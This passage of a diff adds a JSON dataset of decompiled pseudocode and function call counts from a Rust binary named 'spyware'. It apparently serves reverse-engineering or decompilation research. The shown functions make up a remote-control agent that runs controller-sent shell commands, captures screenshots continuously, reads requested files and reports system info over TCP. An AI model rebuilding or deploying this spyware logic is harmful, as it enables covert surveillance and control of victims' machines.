core::result::Result<T,E>::unwrap(v6, v7);\n    *(_QWORD *)(a1 + 16) = v15;\n    *(_OWORD *)a1 = v14;\n    *(_QWORD *)(a1 + 24) = 0x8000000000000000LL;\n    core::ptr::drop_in_place<std::fs::File>((unsigned int)v10);\n  }\n  core::ptr::drop_in_place<spyware::communication::messages::DownloadFileRequest>(a2);\n  return a1;\n}",
+    "_ZN7spyware7actions11log_actions16get_logs_request17h84eb7739ff3a4934E": "__int64 __fastcall spyware::actions::log_actions::get_logs_request(__int64 a1)\n{\n  __int64 v1; // rax\n  __int128 v3; // [rsp+0h] [rbp-78h] BYREF\n  const char *v4; // [rsp+10h] [rbp-68h]\n  __int64 v5; // [rsp+18h] [rbp-60h]\n  __int64 v6; // [rsp+20h] [rbp-58h]\n  __int128 v7; // [rsp+28h] [rbp-50h] BYREF\n  __int64 v8; // [rsp+38h] [rbp-40h]\n  __int128 v9; // [rsp+40h] [rbp-38h]\n  __int128 v10; // [rsp+58h] [rbp-20h] BYREF\n  __int64 v11; // [rsp+68h] [rbp-10h]\n\n  if ( (unsigned __int64)core::sync::atomic::atomic_load(&log::MAX_LOG_LEVEL_FILTER, 0LL) >= 4 )\n  {\n    *(_QWORD *)&v7 = &off_B99D8;\n    *((_QWORD *)&v7 + 1) = 1LL;\n    v8 = 8LL;\n    v9 = 0LL;\n    *(_QWORD *)&v3 = aSpywareActions_0;\n    *((_QWORD *)&v3 + 1) = 29LL;\n    v4 = aSpywareActions_0;\n    v5 = 29LL;\n    v6 = log::__private_api::loc(&off_B99F8);\n    log::__private_api::log(&v7, 4LL, &v3);\n  }\n  spyware::logging::core::get_logs(&v10);\n  if ( __OFSUB__(0LL, (_QWORD)v10) )\n  {\n    if ( core::sync::atomic::atomic_load(&log::MAX_LOG_LEVEL_FILTER, 0LL) )\n    {\n      *(_QWORD *)&v7 = &off_B99E8;\n      *((_QWORD *)&v7 + 1) = 1LL;\n      v8 = 8LL;\n      v9 = 0LL;\n      v1 = log::__private_api::loc(&off_B9A10);\n      *(_QWORD *)&v3 = aSpywareActions_0;\n      *((_QWORD *)&v3 + 1) = 29LL;\n      v4 = aSpywareActions_0;\n      v5 = 29LL;\n      v6 = v1;\n      log::__private_api::log(&v7, 1LL, &v3);\n    }\n    *(_QWORD *)&v3 = 0LL;\n    *((_QWORD *)&v3 + 1) = 8LL;\n    v4 = 0LL;\n    <T as alloc::slice::hack::ConvertVec>::to_vec(&v7);\n    *(_QWORD *)(a1 + 40) = v8;\n    *(_OWORD *)(a1 + 24) = v7;\n    *(_QWORD *)(a1 + 16) = v4;\n    *(_OWORD *)a1 = v3;\n    *(_DWORD *)(a1 + 48) = 1;\n    return a1;\n  }\n  else\n  {\n    *(_QWORD *)(a1 + 16) = v11;\n    *(_OWORD *)a1 = v10;\n    *(_QWORD *)(a1 + 24) = 0x8000000000000000LL;\n    return a1;\n  }\n}",
+    "_ZN7spyware7logging4core12MemoryLogger6global17h99d7eb6ce0974984E": "__int64 spyware::logging::core::MemoryLogger::global()\n{\n  return once_cell::sync::OnceCell<T>::get(&spyware::logging::core::MEMORY_LOGGER_INSTANCE);\n}",
+    "_ZN7spyware7logging4core12MemoryLogger8get_logs17h68454e3110e201f1E": "__int64 __fastcall spyware::logging::core::MemoryLogger::get_logs(__int64 a1, __int64 a2)\n{\n  __int64 v2; // rax\n  __int64 v3; // rdx\n  __int64 v4; // rbx\n  _BYTE v6[48]; // [rsp+8h] [rbp-30h] BYREF\n\n  std::sys::sync::rwlock::futex::RwLock::read(a2 + 24);\n  std::sync::rwlock::RwLockReadGuard<T>::new(v6, a2 + 24);\n  v2 = core::result::Result<T,E>::unwrap(v6);\n  v4 = v3;\n  spyware::logging::memory_logger::CircularMemoryLogs::get_all_logs(a1, v2);\n  return core::ptr::drop_in_place<std::sync::rwlock::RwLockReadGuard<alloc::vec::Vec<alloc::string::String>>>(v4);\n}",
+    "_ZN7spyware7logging4core13setup_logging17hadfb9a3c25f8d0fbE": "char __fastcall spyware::logging::core::setup_logging(_QWORD *a1)\n{\n  __int64 v1; // rax\n  __int64 v2; // rdx\n  __int64 v3; // rcx\n  __int64 v4; // r8\n  __int64 v5; // r9\n  __int64 v6; // rax\n  unsigned __int8 v7; // al\n  __int64 v8; // rdx\n  __int64 v9; // rcx\n  __int64 v10; // r8\n  __int64 v11; // r9\n  __int128 v13; // [rsp+0h] [rbp-128h] BYREF\n  __int128 v14; // [rsp+10h] [rbp-118h]\n  __int128 v15; // [rsp+20h] [rbp-108h]\n  __int128 v16; // [rsp+30h] [rbp-F8h]\n  __int128 v17; // [rsp+40h] [rbp-E8h]\n  __int64 v18; // [rsp+50h] [rbp-D8h]\n  __int128 v19; // [rsp+60h] [rbp-C8h] BYREF\n  __int64 v20; // [rsp+70h] [rbp-B8h]\n  __int64 v21; // [rsp+78h] [rbp-B0h]\n  char v22; // [rsp+80h] [rbp-A8h]\n  __int64 v23; // [rsp+88h] [rbp-A0h]\n  char v24; // [rsp+90h] [rbp-98h]\n  __int64 v25; // [rsp+98h] [rbp-90h]\n  __int64 v26; // [rsp+A0h] [rbp-88h]\n  __int64 v27; // [rsp+A8h] [rbp-80h]\n  __int64 v28; // [rsp+B0h] [rbp-78h]\n  _BYTE v29[8]; // [rsp+C0h] [rbp-68h] BYREF\n  __int128 v30; // [rsp+C8h] [rbp-60h]\n  __int128 v31; // [rsp+D8h] [rbp-50h]\n  __int128 v32; // [rsp+E8h] [rbp-40h]\n  __int128 v33; // [rsp+F8h] [rbp-30h]\n  __int128 v34; // [rsp+108h] [rbp-20h]\n  __int64 v35; // [rsp+118h] [rbp-10h]\n\n  core::sync::atomic::atomic_store(*a1);\n  v1 = a1[1] >> 2;\n  v21 = 0LL;\n  v22 = 0;\n  v23 = 0LL;\n  v24 = 0;\n  v25 = 0LL;\n  v26 = 8LL;\n  v27 = 0LL;\n  v28 = v1;\n  v19 = *(_OWORD *)a1;\n  v20 = a1[2];\n  once_cell::sync::OnceCell<T>::try_insert(v29, &spyware::logging::core::MEMORY_LOGGER_INSTANCE, &v19);\n  if ( (_DWORD)v30 == 6 )\n  {\n    *(_QWORD *)&v13 = 6LL;\n  }\n  else\n  {\n    v13 = v30;\n    v3 = v35;\n    v18 = v35;\n    v17 = v34;\n    v16 = v33;\n    v15 = v32;\n    v14 = v31;\n    if ( (_QWORD)v30 != 6LL )\n    {\n      ((void (__fastcall *)(__int128 *))core::ptr::drop_in_place<core::result::Result<(),spyware::logging::core::MemoryLogger>>)(&v13);\n      return 2;\n    }\n  }\n  v6 = spyware::logging::core::MemoryLogger::global(\n         v29,\n         &spyware::logging::core::MEMORY_LOGGER_INSTANCE,\n         v2,\n         v3,\n         v4,\n         v5,\n         v13,\n         *((_QWORD *)&v13 + 1),\n         v14,\n         *((_QWORD *)&v14 + 1),\n         v15);\n  if ( !v6 )\n    core::option::unwrap_failed(&off_B9BB0);\n  v7 = log::set_logger(v6, &off_B9BC8);\n  core::result::Result<T,E>::unwrap(v7);\n  ((void (__fastcall *)(__int128 *, __int64 (__fastcall **)(), __int64, __int64, __int64, __int64))core::ptr::drop_in_place<core::result::Result<(),spyware::logging::core::MemoryLogger>>)(\n    &v13,\n    &off_B9BC8,\n    v8,\n    v9,\n    v10,\n    v11);\n  return 3;\n}",
+    "_ZN7spyware7logging13memory_logger18compute_used_chars17h6cad6d693caf9651E": "__int64 __fastcall spyware::logging::memory_logger::compute_used_chars(__int64 a1, __int64 a2)\n{\n  return <core::slice::iter::Iter<T> as core::iter::traits::iterator::Iterator>::fold(a1, a1 + 24 * a2);\n}",
+    "_ZN7spyware7logging13memory_logger18CircularMemoryLogs9write_log17h24aec65a22a6ad29E": "__int64 __fastcall spyware::logging::memory_logger::CircularMemoryLogs::write_log(__int64 a1, __int128 *a2)\n{\n  __int64 v2; // r14\n  char v3; // dl\n  unsigned __int8 v4; // bp\n  __int128 v6; // [rsp+0h] [rbp-48h] BYREF\n  __int64 v7; // [rsp+10h] [rbp-38h]\n\n  if ( *((_QWORD *)a2 + 2) >= *(_QWORD *)(a1 + 40) )\n    return core::ptr::drop_in_place<alloc::string::String>(a2);\n  std::sync::rwlock::RwLock<T>::write(&v6, a1);\n  v2 = core::result::Result<T,E>::unwrap(&v6);\n  v4 = v3 & 1;\n  v7 = *((_QWORD *)a2 + 2);\n  v6 = *a2;\n  ((void (__fastcall *)(__int64, __int128 *, char **))alloc::vec::Vec<T,A>::push)(v2 + 16, &v6, &off_B9C28);\n  while ( (unsigned __int64)spyware::logging::memory_logger::compute_used_chars(\n                              *(_QWORD *)(v2 + 24),\n                              *(_QWORD *)(v2 + 32)) >= *(_QWORD *)(a1 + 40) )\n  {\n    alloc::vec::Vec<T,A>::remove(&v6, v2 + 16, 0LL, &off_B9C40);\n    core::ptr::drop_in_place<alloc::string::String>(&v6);\n  }\n  return core::ptr::drop_in_place<std::sync::rwlock::RwLockWriteGuard<alloc::vec::Vec<alloc::string::String>>>(v2, v4);\n}",
+    "_ZN7spyware7logging13memory_logger18CircularMemoryLogs12get_all_logs17hfa3a03f9a722fe3cE": "__int64 __fastcall spyware::logging::memory_logger::CircularMemoryLogs::get_all_logs(__int64 a1, __int64 a2)\n{\n  __int64 v2; // rax\n  __int64 v3; // rdx\n  __int64 v4; // rbx\n  _BYTE v6[48]; // [rsp+8h] [rbp-30h] BYREF\n\n  std::sys::sync::rwlock::futex::RwLock::read(a2);\n  std::sync::rwlock::RwLockReadGuard<T>::new(v6, a2);\n  v2 = core::result::Result<T,E>::unwrap(v6);\n  v4 = v3;\n  <alloc::vec::Vec<T,A> as core::clone::Clone>::clone(a1, v2, &off_B9C70);\n  return core::ptr::drop_in_place<std::sync::rwlock::RwLockReadGuard<alloc::vec::Vec<alloc::string::String>>>(v4);\n}",
+    "_ZN7spyware13communication13serialization27extract_msg_type_and_length17h40fb0f3bb65520f5E": "__int64 __fastcall spyware::communication::serialization::extract_msg_type_and_length(int a1)\n{\n  int v2; // [rsp+4h] [rbp-34h] BYREF\n  _QWORD v3[3]; // [rsp+8h] [rbp-30h] BYREF\n  _BYTE v4[24]; // [rsp+20h] [rbp-18h] BYREF\n\n  v2 = a1;\n  v3[0] = <core::ops::range::Range<usize> as core::slice::index::SliceIndex<[T]>>::index(&v2);\n  v3[1] = 4LL;\n  v3[2] = 0LL;\n  byteorder::io::ReadBytesExt::read_u32(v4, v3);\n  return (unsigned int)core::result::Result<T,E>::unwrap(v4);\n}",
+    "_ZN7spyware13communication13serialization17serialize_message17hd905e118d95099f9E": "__int64 __fastcall spyware::communication::serialization::serialize_message(__int64 a1, __int64 a2)\n{\n  unsigned int v2; // r15d\n  __int128 v3; // rax\n  __int64 v4; // rax\n  int v6; // [rsp+Ch] [rbp-ACh] BYREF\n  __m256i v7; // [rsp+10h] [rbp-A8h] BYREF\n  __int128 v8; // [rsp+30h] [rbp-88h]\n  __int128 v9; // [rsp+40h] [rbp-78h] BYREF\n  __int64 v10; // [rsp+50h] [rbp-68h]\n  __m256i v11; // [rsp+60h] [rbp-58h] BYREF\n  __int128 v12; // [rsp+80h] [rbp-38h]\n\n  ron::ser::to_string(&v7);\n  if ( v7.m256i_i32[0] != 33 )\n  {\n    v12 = v8;\n    v11 = v7;\n    spyware::communication::serialization::serialize_message::{{closure}}(&v11);\n  }\n  v2 = v7.m256i_u32[6];\n  v10 = v7.m256i_i64[3];\n  v9 = *(_OWORD *)&v7.m256i_u64[1];\n  *(_QWORD *)&v3 = alloc::raw_vec::RawVecInner<A>::with_capacity_in(v7.m256i_i64[3] + 4);\n  *(_OWORD *)v7.m256i_i8 = v3;\n  v7.m256i_i64[2] = 0LL;\n  v6 = 0;\n  v4 = <core::ops::range::Range<usize> as core::slice::index::SliceIndex<[T]>>::index_mut(&v6);\n  v11.m256i_i32[0] = _byteswap_ulong(v2);\n  core::slice::<impl [T]>::copy_from_slice(v4, 4LL, &v11, 4LL, &off_B9DF8);\n  std::io::impls::<impl std::io::Write for alloc::vec::Vec<u8,A>>::write_all(&v7, &v6);\n  <alloc::vec::Vec<T,A> as core::iter::traits::collect::IntoIterator>::into_iter(&v11, &v9);\n  <alloc::vec::Vec<T,A> as alloc::vec::spec_extend::SpecExtend<T,alloc::vec::into_iter::IntoIter<T>>>::spec_extend(\n    &v7,\n    &v11,\n    &off_B9E10);\n  *(_QWORD *)(a1 + 16) = v7.m256i_i64[2];\n  *(_OWORD *)a1 = *(_OWORD *)v7.m256i_i8;\n  core::ptr::drop_in_place<spyware::communication::messages::Message>(a2);\n  return a1;\n}",
+    "_ZN7spyware7actions18screenshot_actions22get_screenshot_request17h77f87121c90614c4E": "__int64 __fastcall spyware::actions::screenshot_actions::get_screenshot_request(__int64 a1)\n{\n  __int64 v2; // [rsp+8h] [rbp-180h] BYREF\n  __int128 v3; // [rsp+10h] [rbp-178h] BYREF\n  __int128 *v4; // [rsp+20h] [rbp-168h]\n  __m128i v5; // [rsp+28h] [rbp-160h]\n  __int128 v6; // [rsp+58h] [rbp-130h] BYREF\n  __int64 v7; // [rsp+68h] [rbp-120h]\n  __int64 v8; // [rsp+70h] [rbp-118h] BYREF\n  __int64 v9; // [rsp+78h] [rbp-110h]\n  __m128i v10; // [rsp+80h] [rbp-108h] BYREF\n  const char *v11; // [rsp+90h] [rbp-F8h]\n  __int128 v12; // [rsp+98h] [rbp-F0h] BYREF\n  __int128 *v13; // [rsp+A8h] [rbp-E0h]\n  __m128i v14; // [rsp+B0h] [rbp-D8h] BYREF\n  const char *v15; // [rsp+C0h] [rbp-C8h]\n  __int64 v16; // [rsp+C8h] [rbp-C0h]\n  __int64 v17; // [rsp+D0h] [rbp-B8h]\n  __m128i v18; // [rsp+F8h] [rbp-90h] BYREF\n  const char *v19; // [rsp+108h] [rbp-80h]\n  __m128i v20; // [rsp+110h] [rbp-78h] BYREF\n  _BYTE v21[32]; // [rsp+120h] [rbp-68h] BYREF\n  _BYTE v22[72]; // [rsp+140h] [rbp-48h] BYREF\n\n  *(_QWORD *)&v6 = 0LL;\n  *((_QWORD *)&v6 + 1) = 8LL;\n  v7 = 0LL;\n  if ( (unsigned __int64)core::sync::atomic::atomic_load() >= 4 )\n  {\n    *(_QWORD *)&v3 = &off_B9F08;\n    *((_QWORD *)&v3 + 1) = 1LL;\n    v4 = (_OWORD *)&byte_8;\n    v5 = 0LL;\n    v14.m128i_i64[0] = (__int64)aSpywareActions_1;\n    v14.m128i_i64[1] = 36LL;\n    v15 = aSpywareActions_1;\n    v16 = 36LL;\n    v17 = log::__private_api::loc(&off_B9F38);\n    log::__private_api::log(&v3, 4LL, &v14);\n  }\n  scrap::common::x11::Display::all(&v3);\n  core::result::Result<T,E>::expect(v22, &v3);\n  <alloc::vec::Vec<T,A> as core::iter::traits::collect::IntoIterator>::into_iter(v21, v22);\n  <alloc::vec::into_iter::IntoIter<T,A> as core::iter::traits::iterator::Iterator>::next(&v18, v21);\n  if ( BYTE4(v19) != 2 )\n  {\n    v11 = v19;\n    v10 = _mm_loadu_si128(&v18);\n    *(_QWORD *)&v3 = &off_B9F18;\n    *((_QWORD *)&v3 + 1) = 1LL;\n    v4 = (_OWORD *)&byte_8;\n    v5 = 0LL;\n    std::io::stdio::_print(&v3);\n    v15 = v11;\n    v14 = _mm_load_si128(&v10);\n    scrap::common::x11::Capturer::new(&v3, &v14);\n    core::result::Result<T,E>::expect(&v14, &v3);\n    v20 = _mm_unpacklo_epi32(_mm_unpacklo_epi16(_mm_cvtsi32_si128(HIDWORD(v17)), (__m128i)0LL), (__m128i)0LL);\n    while ( 1 )\n    {\n      while ( 1 )\n      {\n        scrap::common::x11::Capturer::frame(&v8, &v14);\n        if ( !v8 )\n          break;\n        <T as alloc::slice::hack::ConvertVec>::to_vec(&v12, v8, v9);\n        v4 = v13;\n        v3 = v12;\n        v5 = _mm_load_si128(&v20);\n        alloc::vec::Vec<T,A>::push(&v6, &v3);\n      }\n      v2 = v9;\n      if ( (unsigned __int8)std::io::error::Error::kind() != 13 )\n      {\n        *(_QWORD *)&v12 = &v2;\n        *((_QWORD *)&v12 + 1) = <std::io::error::Error as core::fmt::Display>::fmt;\n        *(_QWORD *)&v3 = &off_B9F28;\n        *((_QWORD *)&v3 + 1) = 1LL;\n        v4 = &v12;\n        v5 = (__m128i)1uLL;\n        core::panicking::panic_fmt(&v3, &off_B9F98);\n      }\n      std::thread::sleep(0LL, 16666666LL);\n      core::ptr::drop_in_place<std::io::error::Error>(&v2);\n    }\n  }\n  core::ptr::drop_in_place<alloc::vec::into_iter::IntoIter<scrap::common::x11::Display>>(v21);\n  *(_QWORD *)(a1 + 16) = v7;\n  *(_OWORD *)a1 = v6;\n  *(_QWORD *)(a1 + 24) = 0x8000000000000000LL;\n  return a1;\n}",
+    "_ZN7spyware7actions8commands11run_command17ha7c0eb7cdcbdbc69E": "__int64 __fastcall spyware::actions::commands::run_command(__int64 a1, __int64 a2, __int64 a3)\n{\n  _BYTE v4[8]; // [rsp+8h] [rbp-70h] BYREF\n  __int64 v5; // [rsp+10h] [rbp-68h]\n  __int64 v6; // [rsp+18h] [rbp-60h]\n  _QWORD v7[2]; // [rsp+20h] [rbp-58h] BYREF\n  _QWORD v8[2]; // [rsp+30h] [rbp-48h] BYREF\n  _QWORD v9[7]; // [rsp+40h] [rbp-38h] BYREF\n\n  v7[0] = a2;\n  v7[1] = a3;\n  v8[0] = v7;\n  v8[1] = <&T as core::fmt::Display>::fmt;\n  v9[0] = &unk_11890;\n  v9[1] = 1LL;\n  v9[4] = 0LL;\n  v9[2] = v8;\n  v9[3] = 1LL;\n  core::option::Option<T>::map_or_else(v4, v9);\n  cmd_lib::run_fun(a1, v5, v6);\n  return core::ptr::drop_in_place<alloc::string::String>(v4);\n}",
+    "_ZN7spyware7actions8commands19run_command_message17h528f548903eb1e39E": "__int64 __fastcall spyware::actions::commands::run_command_message(__int64 a1, __int64 a2)\n{\n  __int64 v2; // rax\n  char v3; // r15\n  int v4; // ebp\n  __int64 v5; // rax\n  __int128 v7; // [rsp+0h] [rbp-C8h] BYREF\n  const char *v8; // [rsp+10h] [rbp-B8h]\n  __int64 v9; // [rsp+18h] [rbp-B0h]\n  __int64 v10; // [rsp+20h] [rbp-A8h]\n  _QWORD v11[2]; // [rsp+30h] [rbp-98h] BYREF\n  __int128 v12; // [rsp+40h] [rbp-88h] BYREF\n  const char *v13; // [rsp+50h] [rbp-78h]\n  __int64 v14; // [rsp+58h] [rbp-70h]\n  __int64 v15; // [rsp+60h] [rbp-68h]\n  __int128 v16; // [rsp+70h] [rbp-58h] BYREF\n  __int64 v17; // [rsp+80h] [rbp-48h]\n  __int128 v18; // [rsp+90h] [rbp-38h] BYREF\n  __int64 v19; // [rsp+A0h] [rbp-28h]\n\n  if ( (unsigned __int64)core::sync::atomic::atomic_load() >= 4 )\n  {\n    *(_QWORD *)&v18 = a2;\n    *(_QWORD *)&v16 = &v18;\n    *((_QWORD *)&v16 + 1) = <&T as core::fmt::Display>::fmt;\n    *(_QWORD *)&v12 = &off_BA0B8;\n    *((_QWORD *)&v12 + 1) = 2LL;\n    v15 = 0LL;\n    v13 = (const char *)&v16;\n    v14 = 1LL;\n    *(_QWORD *)&v7 = aSpywareActions_2;\n    *((_QWORD *)&v7 + 1) = 26LL;\n    v8 = aSpywareActions_2;\n    v9 = 26LL;\n    v10 = log::__private_api::loc(&off_BA0F8);\n    log::__private_api::log(&v12, 4LL, &v7);\n  }\n  spyware::actions::commands::run_command((__int64)&v18, *(_QWORD *)(a2 + 8), *(_QWORD *)(a2 + 16));\n  if ( __OFSUB__(0LL, (_QWORD)v18) )\n  {\n    v11[0] = *((_QWORD *)&v18 + 1);\n    if ( core::sync::atomic::atomic_load() )\n    {\n      *(_QWORD *)&v16 = v11;\n      *((_QWORD *)&v16 + 1) = <std::io::error::Error as core::fmt::Display>::fmt;\n      *(_QWORD *)&v12 = &off_BA0E8;\n      *((_QWORD *)&v12 + 1) = 1LL;\n      v15 = 0LL;\n      v13 = (const char *)&v16;\n      v14 = 1LL;\n      v2 = log::__private_api::loc(&off_BA128);\n      *(_QWORD *)&v7 = aSpywareActions_2;\n      *((_QWORD *)&v7 + 1) = 26LL;\n      v8 = aSpywareActions_2;\n      v9 = 26LL;\n      v10 = v2;\n      log::__private_api::log(&v12, 1LL, &v7);\n    }\n    <T as alloc::slice::hack::ConvertVec>::to_vec(&v12);\n    v8 = v13;\n    v7 = v12;\n    std::io::error::repr_bitpacked::decode_repr(&v12, v11[0]);\n    v3 = v12;\n    v4 = DWORD1(v12);\n    <T as alloc::string::SpecToString>::spec_to_string(&v12, v11);\n    *(_QWORD *)(a1 + 40) = v13;\n    *(_OWORD *)(a1 + 24) = v12;\n    *(_QWORD *)(a1 + 16) = v8;\n    *(_OWORD *)a1 = v7;\n    *(_DWORD *)(a1 + 48) = v3 != 0 ? -1 : v4;\n    core::ptr::drop_in_place<std::io::error::Error>(v11[0]);\n  }\n  else\n  {\n    v17 = v19;\n    v16 = v18;\n    if ( (unsigned __int64)core::sync::atomic::atomic_load() >= 4 )\n    {\n      v11[0] = &v16;\n      v11[1] = <alloc::string::String as core::fmt::Display>::fmt;\n      *(_QWORD *)&v12 = &off_BA0D8;\n      *((_QWORD *)&v12 + 1) = 1LL;\n      v15 = 0LL;\n      v13 = (const char *)v11;\n      v14 = 1LL;\n      v5 = log::__private_api::loc(&off_BA110);\n      *(_QWORD *)&v7 = aSpywareActions_2;\n      *((_QWORD *)&v7 + 1) = 26LL;\n      v8 = aSpywareActions_2;\n      v9 = 26LL;\n      v10 = v5;\n      log::__private_api::log(&v12, 4LL, &v7);\n    }\n    *(_QWORD *)(a1 + 16) = v17;\n    *(_OWORD *)a1 = v16;\n    *(_QWORD *)(a1 + 24) = 0x8000000000000000LL;\n  }\n  core::ptr::drop_in_place<spyware::communication::messages::RunCommandRequest>(a2);\n  return a1;\n}"
+  },
+  "function_call_counts": {
+    "_ZN7spyware13communication6server13send_response17h17eae7eef2507d79E": {
+      "spyware::communication::serialization::serialize_message": 1,
+      "log::__private_api::loc": 1,
+      "log::__private_api::log": 1,
+      "core::sync::atomic::atomic_load": 1,
+      "std::io::Write::write_all": 1,
+      "core::ptr::drop_in_place<alloc::vec::Vec<u8>>": 1
+    },
+    "_ZN7spyware13communication6server14handle_message17h02435bd595e8370dE": {
+      "spyware::actions::commands::run_command_message": 1,
+      "spyware::communication::server::send_response": 5,
+      "core::result::Result<T,E>::unwrap": 4,
+      "core::ptr::drop_in_place<spyware::communication::messages::Message>": 5,
+      "spyware::actions::basic_info::download_file_message": 1,
+      "core::ptr::drop_in_place<spyware::communication::messages::ErrorInfo>": 2,
+      "spyware::actions::basic_info::get_basic_info_request": 1,
+      "core::ptr::drop_in_place<spyware::communication::messages::DownloadFileRequest>": 2,
+      "spyware::actions::log_actions::get_logs_request": 1,
+      "spyware::actions::screenshot_actions::get_screenshot_request": 1,
+      "core::sync::atomic::atomic_load": 1,
+      "log::__private_api::loc": 1,
+      "log::__private_api::log": 1
+    },
+    "_ZN7spyware13communication6server11get_message17hbc00a55f19d841bbE": {
+      "std::io::default_read_exact": 2,
+      "spyware::communication::serialization::extract_msg_type_and_length": 1,
+      "<u8 as alloc::vec::spec_from_elem::SpecFromElem>::from_elem": 1,
+      "core::result::Result<T,E>::expect": 1,
+      "ron::de::from_bytes": 1,
+      "core::result::Result<T,E>::unwrap": 1,
+      "core::ptr::drop_in_place<alloc::vec::Vec<u8>>": 1,
+      "std::net::tcp::TcpStream::peer_addr": 1,
+      "core::ptr::drop_in_place<std::io::error::Error>": 1,
+      "log::__private_api::loc": 1,
+      "log::__private_api::log": 1,
+      "core::sync::atomic::atomic_load": 1,
+      "std::net::tcp::TcpStream::shutdown": 1
+    },
+    "_ZN7spyware13communication6server13handle_client17hb99b66a85b0a9c88E": {
+      "std::net::tcp::TcpStream::peer_addr": 1,
+      "log::__private_api::loc": 2,
+      "log::__private_api::log": 2,
+      "core::sync::atomic::atomic_load": 2,
+      "spyware::communication::server::get_message": 1,
+      "std::io::stdio::_print": 2,
+      "spyware::communication::server::handle_message": 1,
+      "core::ptr::drop_in_place<std::net::tcp::TcpStream>": 1
+    },
+    "_ZN7spyware13communication6server10run_server17hf575f6adb91dbfb6E": {
+      "core::option::Option<T>::map_or_else": 1,
+      "std::net::tcp::TcpListener::bind": 1,
+      "std::net::udp::UdpSocket::local_addr": 1,
+      "log::__private_api::loc": 4,
+      "log::__private_api::log": 4,
+      "core::sync::atomic::atomic_load": 4,
+      "core::ptr::drop_in_place<std::io::error::Error>": 2,
+      "<std::net::tcp::Incoming as core::iter::traits::iterator::Iterator>::next": 1,
+      "std::panicking::begin_panic": 1,
+      "std::net::tcp::TcpStream::peer_addr": 1,
+      "core::ptr::drop_in_place<std::net::tcp::TcpStream>": 2,
+      "std::thread::Builder::spawn_unchecked": 1,
+      "core::result::Result<T,E>::expect": 1,
+      "core::ptr::drop_in_place<std::thread::JoinHandle<core::result::Result<(),std::io::error::Error>>>": 1
+    },
+    "_ZN7spyware13communication8messages1_95_$LT$impl$u20$serde..ser..Serialize$u20$for$u20$spyware..communication..messages..ErrorInfo$GT$9serialize17h8c3fceac6ed6801fE": {
+      "<&mut ron::ser::Serializer<W> as serde::ser::Serializer>::serialize_struct": 1,
+      "<ron::ser::Compound<W> as serde::ser::SerializeStruct>::serialize_field": 2,
+      "<ron::ser::Compound<W> as serde::ser::SerializeStruct>::end": 1
+    },
+    "_ZN7spyware13communication8messages1_96_$LT$impl$u20$serde..de..Deserialize$u20$for$u20$spyware..communication..messages..ErrorInfo$GT$11deserialize17h16e2a26e495d2d09E": {
+      "<&mut ron::de::Deserializer as serde::de::Deserializer>::deserialize_struct": 1
+    },
+    "_ZN7spyware13communication8messages1_103_$LT$impl$u20$serde..ser..Serialize$u20$for$u20$spyware..communication..messages..RunCommandRequest$GT$9serialize17h05e636ca783c8b29E": {
+      "<&mut ron::ser::Serializer<W> as serde::ser::Serializer>::serialize_struct": 1,
+      "<ron::ser::Compound<W> as serde::ser::SerializeStruct>::serialize_field": 2,
+      "<ron::ser::Compound<W> as serde::ser::SerializeStruct>::end": 1
+    },
+    "_ZN7spyware13communication8messages1_104_$LT$impl$u20$serde..de..Deserialize$u20$for$u20$spyware..communication..messages..RunCommandRequest$GT$11deserialize17hf4107a861e3d2baeE": {
+      "<&mut ron::de::Deserializer as serde::de::Deserializer>::deserialize_struct": 1
+    },
+    "_ZN7spyware13communication8messages1_104_$LT$impl$u20$serde..ser..Serialize$u20$for$u20$spyware..communication..messages..RunCommandResponse$GT$9serialize17hc9c819935a81fe1bE": {
+      "<&mut ron::ser::Serializer<W> as serde::ser::Serializer>::serialize_struct": 1,
+      "<ron::ser::Compound<W> as serde::ser::SerializeStruct>::serialize_field": 2,
+      "<ron::ser::Compound<W> as serde::ser::SerializeStruct>::end": 1
+    },
+    "_ZN7spyware13communication8messages1_105_$LT$impl$u20$serde..de..Deserialize$u20$for$u20$spyware..communication..messages..RunCommandResponse$GT$11deserialize17h67b73dba800a3318E": {
+      "<&mut ron::de::Deserializer as serde::de::Deserializer>::deserialize_struct": 1
+    },
+    "_ZN7spyware13communication8messages1_105_$LT$impl$u20$serde..ser..Serialize$u20$for$u20$spyware..communication..messages..DownloadFileRequest$GT$9serialize17h54b8d5981f6378f4E": {
+      "<&mut ron::ser::Serializer<W> as serde::ser::Serializer>::serialize_struct": 1,
+      "<ron::ser::Compound<W> as serde::ser::SerializeStruct>::serialize_field": 1,
+      "<ron::ser::Compound<W> as serde::ser::SerializeStruct>::end": 1
+    },
+    "_ZN7spyware13communication8messages1_106_$LT$impl$u20$serde..de..Deserialize$u20$for$u20$spyware..communication..messages..DownloadFileRequest$GT$11deserialize17h40c06322ea6d693bE": {
+      "<&mut ron::de::Deserializer as serde::de::Deserializer>::deserialize_struct": 1
+    },
+    "_ZN7spyware13communication8messages1_106_$LT$impl$u20$serde..ser..Serialize$u20$for$u20$spyware..communication..messages..DownloadFileResponse$GT$9serialize17hacec97a4be0cc2f5E": {
+      "<&mut ron::ser::Serializer<W> as serde::ser::Serializer>::serialize_struct": 1,
+      "<ron::ser::Compound<W> as serde::ser::SerializeStruct>::serialize_field": 2,
+      "<ron::ser::Compound<W> as serde::ser::SerializeStruct>::end": 1
+    },
+    "_ZN7spyware13communication8messages1_107_$LT$impl$u20$serde..de..Deserialize$u20$for$u20$spyware..communication..messages..DownloadFileResponse$GT$11deserialize17h11c5c4e17211802eE": {
+      "<&mut ron::de::Deserializer as serde::de::Deserializer>::deserialize_struct": 1
+    },
+    "_ZN7spyware13communication8messages1_105_$LT$impl$u20$serde..ser..Serialize$u20$for$u20$spyware..communication..messages..GetBasicInfoRequest$GT$9serialize17h0b9495116de8f9c4E": {
+      "<&mut ron::ser::Serializer<W> as serde::ser::Serializer>::serialize_struct": 1,
+      "<ron::ser::Compound<W> as serde::ser::SerializeStruct>::serialize_field": 1,
+      "<ron::ser::Compound<W> as serde::ser::SerializeStruct>::end": 1
+    },
+    "_ZN7spyware13communication8messages1_106_$LT$impl$u20$serde..de..Deserialize$u20$for$u20$spyware..communication..messages..GetBasicInfoRequest$GT$11deserialize17hcdf93e6675e0bf2cE": {
+      "<&mut ron::de::Deserializer as serde::de::Deserializer>::deserialize_struct": 1
+    },
+    "_ZN7spyware13communication8messages1_101_$LT$impl$u20$serde..ser..Serialize$u20$for$u20$spyware..communication..messages..OperatingSystem$GT$9serialize17h8cffced7504157a5E": {
+      "<&mut ron::ser::Serializer<W> as serde::ser::Serializer>::serialize_unit_variant": 7
+    },
